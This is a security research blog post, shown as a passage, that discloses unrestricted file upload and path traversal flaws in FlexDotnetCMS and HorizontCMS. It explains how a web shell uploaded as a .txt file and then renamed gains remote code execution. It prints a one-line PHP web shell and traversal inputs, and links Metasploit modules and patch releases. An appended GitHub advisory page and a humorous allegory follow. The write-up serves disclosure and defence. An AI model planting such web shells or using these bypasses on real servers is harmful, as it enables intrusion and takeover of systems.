FlexDotnetCMS is an ASP .NET application, so I wanted to see if it would be possible upload a rogue ASP file. On GitHub I found a [simple ASP web shell](https://github.com/tennc/webshell/blob/master/asp/webshell.asp?ref=blog.vonahi.io) that would allow me to execute code on the server if I could find a way to upload and access the file. I grabbed the file from GitHub, removed a bunch of unnecessary code from it, and saved it as *webshell.asp*. I tried uploading this file, but FlexDotnetCMS didn’t let me because the ASP file extension was blacklisted.

![](https://blog.vonahi.io/content/images/2020/11/image1.png)

Alright, so the app had at least the most basic protection against arbitrary upload of files with dangerous extensions. But what about files with seemingly innocent extensions? In order to test this, I renamed my payload to *webshell.txt* and tried to upload it.

![](https://blog.vonahi.io/content/images/2020/11/image2-1.png)

It worked! My file appeared in the uploads folder and I was able to access the contents via a direct URL to the file. However, the server currently treated my payload as a text file, while I needed it to regard it as an ASP file so it would execute my web shell instead of merely displaying the code. The most straightforward way of doing this would be to rename the file. I noticed that FlexDotnetCMS had a simple rename function that would let me test this.

![](https://blog.vonahi.io/content/images/2020/11/image3.png)

I clicked the rename function, changed the file name back to *webshell.asp*, hit enter, and…

![](https://blog.vonahi.io/content/images/2020/11/image5.png)

Success! Apparently, FlexDotnetCMS only blacklisted dangerous file types during upload, but not when users renamed files, which is like locking your car but leaving the window wide open. In order to verify that I was actually able to access the web shell now that it was on the server, I clicked on the button redirecting to the file URL at /media/uploads/webshell.asp. The result?

![](https://blog.vonahi.io/content/images/2020/11/flexdotnet_web_shell-1.png)

Behold, our web shell! Now let’s see if we can get actually use it to run some code. I tried running the *whoami* command, which should display the username of the active user on the server...

![](https://blog.vonahi.io/content/images/2020/11/flexdotnet_web_shell_whoami.png)

BOOYAH! Remote code execution achieved!

![](https://blog.vonahi.io/content/images/2020/11/dance-5.gif)

Well, that was easier than I thought. And the best part was that the attack resulted in remote code execution with *elevated privileges*. FlexDotnetCMS was designed to run on a Microsoft Internet Information Services (IIS) server. If IIS or IIS Express is configured to allow remote connections, the IIS/IIS Express process must run with elevated privileges, and an attacker exploiting this vulnerability will inherit these privileges from the server process.

But there was more. I went back to the *FileManager*, and opened my webshell in the *FileEditor* (*/Admin/Views/FileEditor/Default.aspx?LoadFile=/media/uploads/webshell.asp*).

![](https://blog.vonahi.io/content/images/2020/11/file_manager_edit-2.png)

I discovered that in addition to letting users edit files, the *FileEditor* offered a second method for renaming files. Testing with the *webshell.txt* file confirmed that the attack was also possible by using the *FileEditor* instead of the rename function to rename the payload.

![](https://blog.vonahi.io/content/images/2020/11/file_editor_saved.png)
### Demo video

The demo video below shows the full attack via the rename function:

### Metasploit module

Instead of throwing together a proof-of-concept (PoC) exploit with limited functionality, I decided to write a full-fledged [Metasploit module](https://github.com/rapid7/metasploit-framework/pull/14339?ref=blog.vonahi.io) for this attack.

### Patches

* [FlexDotnetCMS v.1.5.8](https://github.com/MacdonaldRobinson/FlexDotnetCMS/releases/tag/v1.5.8?ref=blog.vonahi.io) fixes the attack via the rename function, but is still vulnerable to renaming via the *FileEditor.*
* [FlexDotnetCMS v.1.5.9](https://github.com/MacdonaldRobinson/FlexDotnetCMS/releases/tag/v1.5.9?ref=blog.vonahi.io) fixes the attack via the *FileEditor* as well.

## Incorrect access control in FlexDotnetCMS (CVE-2020-27385)

While scrutinizing the *FileEditor*, I discovered a second vulnerability, which was an access control issue. As it turns out, the *FileEditor* allowed users to read and modify files from anywhere on the host system. There were two ways to achieve this. The first method was by entering the full path to an existing file into the *FileEditor*’s  “Select File” input field and then loading the file.

![](https://blog.vonahi.io/content/images/2020/11/image7.png)

The second method was via directory traversal, i.e. by entering a .. (dot dot) path such as *../../<file>* or *..\..\..\<file>* in the input field.

![](https://blog.vonahi.io/content/images/2020/11/file_editor_traversal.png)

While both of these attacks require the attacker to guess the correct full path or traversal path to an existing file, they could both be used to enumerate the host system in search of sensitive files to access and even modify. And because these actions were performed with elevated privileges (inherited from the IIS/IIS Express process as mentioned above), an attacker would even have access to files in protected directories like *Program Files*, *Program Files (x86)*, *Windows\System32* and *Windows\SysWOW64*.

### Demo video

The demo video below shows how this attack works via directory traversal:

### Patches

* FlexDotnetCMS v.1.5.8 fixes the attack when users specify the full path in the *FileEditor*, but is still vulnerable to directory traversal.
* FlexDotnetCMS v.1.5.11 fixes the attack via directory traversal as well.

## Unrestricted file upload in HorizontCMS (CVE-2020-27387)

After wrapping up my research on FlexDotnetCMS, I continued my hunt for RCE vulnerabilities, and soon came across HorizontCMS. Much like with the former app, all core functionality is only available to authenticated users. After logging in to the user dashboard, I soon found that HorizontCMS also has its own *File Manager*, so I started my research there.

![](https://blog.vonahi.io/content/images/2020/11/file_manager-1.png)

Since HorizontCMS is a PHP app, I wanted to see if the *File Manager* would allow me to upload and execute a PHP payload. In order to test this, I created a PHP file with the following contents:

> <?php system($\_GET["cmd"]); ?>

When I attempted to upload this mini PHP web shell as *test.php*, I was surprised to see that it seemed to work straight off the bat.

![](https://blog.vonahi.io/content/images/2020/11/image1-1.png)

However, when I used the *File Manager* to look for my payload, I noticed that the file had been renamed to a .TXT file with a long, randomly generated name.

![](https://blog.vonahi.io/content/images/2020/11/file_manager_upload_random_name.png)

I obtained the full URL to the file by hovering over the download button. While I was able to access the file at */storage/<file\_name>*, I could only view the contents, since HorizontCMS was simply treating it as a text file. Much like the person in the below images, I attempted in vain to overcome this insurmountable obstacle, and eventually threw in the towel.

![](https://blog.vonahi.io/content/images/2020/11/tiny_fence_meme.png)

Just kidding. I simply located the *File Manager*’s rename function and tried changing the name back to the original.

![](https://blog.vonahi.io/content/images/2020/11/file_manager_rename.png)

As you’ve probably guessed by now...

![](https://blog.vonahi.io/content/images/2020/11/image4.png)

It worked like a charm! A visit to */storage/test.php* now displayed a blank page, as expected. Finally, I attempted to run the Unix *id* command (since I had installed HorizontCMS on an Ubuntu VM). The result...

![](https://blog.vonahi.io/content/images/2020/11/image5-2.png)

Yay! RCE again!

![tenor-1](https://blog.vonahi.io/content/images/2020/11/tenor-1.gif)

### Demo video

The demo video below shows the full attack:

### Metasploit module

Once again, my PoC for the attack is a [Metasploit module](https://github.com/rapid7/metasploit-framework/pull/14340?ref=blog.vonahi.io).

### Patch

Commit *[436b5ab](https://github.com/ttimot24/HorizontCMS/commit/436b5ab679fd27afa3d99c023dbe103113da4fee?ref=blog.vonahi.io)* fixes the vulnerability.

## Implications: A sea of vulnerabilities

Precisely because the vulnerabilities discussed here are far from impressive attacks, they point to a much larger problem that continues to plague software development: negligence of basic security practices. Unfortunately many developers still don't pay sufficient attention to security. As a result, GitHub, SourceForge and other open source platforms are sprawling with apps vulnerable to severe, low-complexity zero-day attacks like those covered here. I’m not going to pretend this is a solvable problem at this point, though I do think significant progress can be made in the coming years as the result of growing security awareness and the availability of an increasing number of automated code analysis solutions, such as GitHub’s new [Code Scanning](https://github.blog/2020-09-30-code-scanning-is-now-available/?ref=blog.vonahi.io) feature.

On the off chance that anyone reading this is interested in a few pointers on secure coding, here are my two cents:

* **Adopt a secure coding mindset**: Assume that people are going to try and find vulnerabilities in your software, no matter how insignificant the project may seem.
* **Follow best practices**: Follow secure coding best practices such as those outlined in the [OWASP Secure Coding Practices-Quick Reference Guide](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/migrated_content?ref=blog.vonahi.io).
* **Familiarize yourself with common attacks**: Getting familiar with the [OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/?ref=blog.vonahi.io) and other common attacks will help you avoid writing vulnerable code.
* **Scan your code:** If possible, use automated code scanning solutions to help catch at least the most basic vulnerabilities in your code.

Alright folks, it’s finally time for the highlight of this article: my little metaphor-story-thingy. Enjoy!

## A Tale of Two Chainsaws

**(or one, but like, in different stages of assembly)**

### Dawn

“Hold it! I cannot let you enter with that,” the security guard outside the hardware store says sternly as he moves his hand toward the banana-yellow taser in his duty holster.

“Why?” W. wonders with feigned surprise, seemingly unimpressed by the guard’s aggressive body language.

“Because you are holding a running chainsaw, and this ain’t Texas,” the guard retorts in a low, threatening voice, while placing his right hand firmly over the taser’s handle.

“Fair enough,” W. replies, casually shrugging their shoulders before flicking the switch to kill the engine. “May I enter now?”

“You most certainly may not!” The guard bellows. “We don’t sell chainsaws, so I don’t know what the hell you’re planning to do with it, but it ain’t gonna happen on my watch. Beat it, freak, before I tase the life out of you.”

“If you say so,” W. replies, curling their lips into a sly grin. “Have a nice day.”

### Dusk

“Good evening, may I inspect the contents of your bag?” The guard demands rather than asks as W. walks up to the store.

“Of course,” W. nods, handing over the duffel bag.

“Is this... Is this a chainsaw?” The guard inquires with a suspicious frown.

“It was, before I dissembled it,” W. responds calmly. “It broke down, so I took it apart in an attempt to fix it, but that didn’t work, and now I don’t know how to put it back together again. I brought it here because I’m hoping to get some advice on how to fix it. Plus I’m pretty sure I lost a few nuts and washers in the process that I’ll need to replace.”

“Sounds like me whenever I’m asked to fix something,” the guard chuckles. “Have a good one.”

“Thanks! Same to you.”

Once inside, W. grabs a shopping cart and puts the duffel bag in it. Leisurely strolling through the aisles, they fill their cart with a variety of items. A screwdriver, a few combination wrenches, a chainsaw sharpener, a bottle of bar & chain oil, a pair of safety gloves and finally a pair of safety glasses. To a casual observer, W. would appear like a regular customer. Nothing out of the ordinary. However, that casual observer would soon be proven wrong.

W. heads over to the garden section and parks the cart next to a large picnic table. No one seems to take notice of W. as they take the items out of the shopping cart and place them neatly on the wooden tabletop. W. sits down at the table, zips open the duffel bag, and begins to assemble the chainsaw with the speed and precision of a skilled mechanic. A few passing shoppers and employees raise their eyebrows at the rather impressive spectacle, but no one says a word until W. picks up the chainsaw and pulls the starter rope, bringing the engine to life with a loud sputter.

“Hey!  What are you doing? Are you crazy?!” A voice yells from behind. W. turns around to see the security guard running toward them from across the store, two employees in bright orange uniforms at his heels. “You can’t use that thing in here!” The guard shrieks with rage.

“Well, it seems like I fixed it,” W. responds coldly. They flick the safety switch and press the trigger for half a second, letting the chain race around the blade with a deafening roar. “See? It runs” W. adds, as the noise dies down. Holding the chainsaw at the handle with one hand, W. uses the other to put the safety glasses on, never breaking eye contact with the guard, who’s bloated face is slowly turning pale. “It runs,” W. repeats in a dark, ominous voice, moving their hand back toward the trigger. “And perhaps so should you...”

---

********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************About Vonahi Security********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
Vonahi Security is building the future of offensive cybersecurity consulting services through automation. We provide the world's first and only automated network penetration test platform that replicates full attack simulations with zero configuration. With over 30 years of combined industry experience in both offensive and defensive security operations, our team of certified consultants have experience working with a significant number of organizations, industries, networks, and technologies. Our service expertise includes Penetration Testing and Adversary Simulations. Vonahi Security is headquartered in Atlanta, GA. To learn more, visit [www.vonahi.io](https://www.vonahi.io/?ref=blog.vonahi.io)

********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************Stay Informed********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************

* Connect with us on [Linkedin](https://www.linkedin.com/company/vonahisec/?ref=blog.vonahi.io) for Professional Security Tips
* Like us on [Facebook](https://www.facebook.com/vonahisec/) for Personal Security Tips
* Follow us on [Twitter](https://twitter.com/vonahisec?ref=blog.vonahi.io) for News & Threat Updates

![Erik Wynter](/content/images/size/w100/2020/08/cat_laptop.jpg)
[Read More](/author/wynter/)

— Vonahi Security's Blog —
### [research](/tag/research/)

* [When the PATH to SYSTEM is wide open: Philips SmartControl DLL hijacking (CVE-2020-7360)](/when-the-path-to-system-is-wide-open/)
* [2019/2020: A Few Cybersecurity Reflections and Predictions](/2019-year-in-review/)
* [13 Freaky Infosec Facts](/13-freaky-infosec-facts/)

[See all 9 posts →](/tag/research/)

[![SrClient DLL Hijacking: a Windows Server 2012 0-day that won't be patched](/content/images/size/w600/2021/02/blog-post-dll.jpg)](/srclient-dll-hijacking/)
[privilege escalation
## SrClient DLL Hijacking: a Windows Server 2012 0-day that won't be patched

This blog discusses a DLL hijacking vulnerability affecting all versions of Windows Server 2012 (but not Server 2012 R2). This 0-day vulnerability can be exploited for privilege escalation by any regular user and does not require a system reboot, yet it will not be patched by Microsoft.](/srclient-dll-hijacking/)

* Erik Wynter

  [![Erik Wynter](/content/images/size/w100/2020/08/cat_laptop.jpg)](/author/wynter/)

11 min read

[![When the PATH to SYSTEM is wide open: Philips SmartControl DLL hijacking (CVE-2020-7360)](/content/images/size/w600/2020/08/philips-vulnerability-1.jpg)](/when-the-path-to-system-is-wide-open/)
[research
## When the PATH to SYSTEM is wide open: Philips SmartControl DLL hijacking (CVE-2020-7360)

Earlier this year our threat researcher found a DLL hijacking flaw affecting Philips SmartControl (CVE-2020-7360). Our latest blog post combines a write-up of this vulnerability with a general introduction to DLL hijacking for infosec students.](/when-the-path-to-system-is-wide-open/)

* Erik Wynter

  [![Erik Wynter](/content/images/size/w100/2020/08/cat_laptop.jpg)](/author/wynter/)

14 min read

[![Vonahi Security's Blog icon](/content/images/size/w30/2023/10/favicon.png)](https://blog.vonahi.io)

—
What’s in a (re)name: RCE Hunting in CMSs via Unrestricted File Upload
Share this

[Vonahi Security's Blog](https://blog.vonahi.io) © 2025
[Latest Posts](https://blog.vonahi.io)
[Facebook](https://www.facebook.com/vonahisec)
[Twitter](https://twitter.com/vonahisec)
[LinkedIn](https://www.linkedin.com/company/vonahisec)
[GitHub](https://www.github.com/vonahisec)



=== Content from packetstormsecurity.com_5d98268e_20250119_112011.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from github.com_afe93c07_20250119_131400.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-j66w-g54r-w535)

**CVE-2020-27386**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-j66w-g54r-w535)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [Unreviewed](/advisories?query=type%3Aunreviewed)
3. [CVE-2020-27386](/advisories/GHSA-j66w-g54r-w535)

## An unrestricted file upload issue in FlexDotnetCMS before...

High severity

Unreviewed

Published
May 24, 2022
to the GitHub Advisory Database
•
Updated Jan 31, 2023

## Package

No package listed—
[Suggest a package](/advisories/GHSA-j66w-g54r-w535/improve)

## Affected versions

Unknown

## Patched versions

Unknown

## Description

An unrestricted file upload issue in FlexDotnetCMS before v1.5.9 allows an authenticated remote attacker to upload and execute arbitrary files by using the FileManager to upload malicious code (e.g., ASP code) in the form of a safe file type (e.g., a TXT file), and then using the FileEditor (in v1.5.8 and prior) or the FileManager's rename function (in v1.5.7 and prior) to rename the file to an executable extension (e.g., ASP), and finally executing the file via an HTTP GET request to /<path\_to\_file>.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2020-27386>
* [rapid7/metasploit-framework#14339](https://github.com/rapid7/metasploit-framework/pull/14339)
* <https://blog.vonahi.io/whats-in-a-re-name/>
* <https://github.com/MacdonaldRobinson/FlexDotnetCMS/releases/tag/v1.5.9>
* <http://packetstormsecurity.com/files/160411/FlexDotnetCMS-1.5.8-Arbitrary-ASP-File-Upload.html>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2020-27386)
Nov 12, 2020

Published to the GitHub Advisory Database
May 24, 2022

Last updated
Jan 31, 2023

### Severity

High

8.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### [EPSS score](https://www.first.org/epss/user-guide)

19.868%
 (96th percentile)

### Weaknesses

[CWE-434](/advisories?query=cwe%3A434)

### CVE ID

CVE-2020-27386

### GHSA ID

GHSA-j66w-g54r-w535

### Source code

No known source code

Dependabot alerts are not supported on this advisory because it does not have a package from a supported ecosystem with an affected and fixed version.

[Learn more about GitHub language support](https://docs.github.com/get-started/learning-about-github/github-language-support#about-supported-languages)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-j66w-g54r-w535/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


